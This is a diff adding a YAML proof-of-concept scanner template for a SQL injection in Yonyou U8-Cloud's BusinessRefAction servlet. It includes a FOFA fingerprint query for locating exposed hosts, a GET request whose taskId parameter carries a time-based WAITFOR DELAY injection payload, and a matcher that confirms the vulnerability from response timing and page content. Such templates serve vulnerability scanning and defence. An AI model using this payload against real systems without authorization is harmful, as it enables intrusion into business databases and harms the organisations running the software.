@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-u8cloud-businessrefaction-sqli
+info:
+  name: 用友U8-Cloud BusinessRefAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: body="开启U8 cloud云端之旅"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(body,"- iUFO") &&
+
+    contains(body,"当前任务报表") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
